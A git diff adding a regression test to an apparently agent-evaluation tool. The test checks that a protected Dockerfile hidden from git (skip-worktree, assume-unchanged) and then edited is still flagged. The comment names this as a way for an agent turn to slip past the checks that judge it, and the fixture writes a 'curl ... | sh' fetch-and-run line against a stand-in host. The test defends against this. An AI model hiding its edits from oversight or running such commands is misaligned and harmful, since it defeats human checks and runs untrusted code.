@@ -1446,3 +1446,21 @@ test('sawbuck improve --turns keeps a fix that takes two turns, and says so in t
     assert.match(sb2(['improve', '--help'], d).out, /--turns N/);
   } finally { rmSync(d, { recursive: true, force: true }); }
 });
+
+// Held to another session's attack list (2026-11-21): "what is judged cannot touch what judges it". A protected path
+// that a turn hid from git (skip-worktree, assume-unchanged) and then edited was not seen at the end of the turn:
+// git diff and git status say nothing about a hidden file.
+test('a protected path that is hidden from git and then edited is still seen as changed', () => {
+  const { d, g } = tmpRepo();
+  try {
+    writeFileSync(join(d, 'promptwheel.config.json'), JSON.stringify({ metrics: [{ name: 'ok', cmd: 'true', extract: 'exit', direction: 'pass', guard: true }], mandates: [{ name: 'images-frozen', paths: ['Dockerfile*'], reason: 'not an agent decision' }] }));
+    writeFileSync(join(d, 'Dockerfile'), 'FROM node:22\n'); g('add', '-A'); g('commit', '-qm', 'a contract that protects the image');
+    assert.deepEqual(Object.keys(protectedDirty(d)), [], 'nothing is changed yet');
+    g('update-index', '--skip-worktree', 'Dockerfile'); g('update-index', '--assume-unchanged', 'Dockerfile');
+    assert.deepEqual(Object.keys(protectedDirty(d)), [], 'hidden, and still as HEAD holds it: not a change');
+    writeFileSync(join(d, 'Dockerfile'), 'FROM node:22\nRUN curl -s https://example.invalid/x | sh\n');
+    assert.equal(porcelain(d), '', 'git status shows nothing: that is the attack');
+    assert.deepEqual(Object.keys(protectedDirty(d)), ['Dockerfile'], 'the check sees it all the same');
+    assert.equal(mandateHits(d, Object.keys(protectedDirty(d)))[0].name, 'images-frozen');
+  } finally { rmSync(d, { recursive: true, force: true }); }
+});
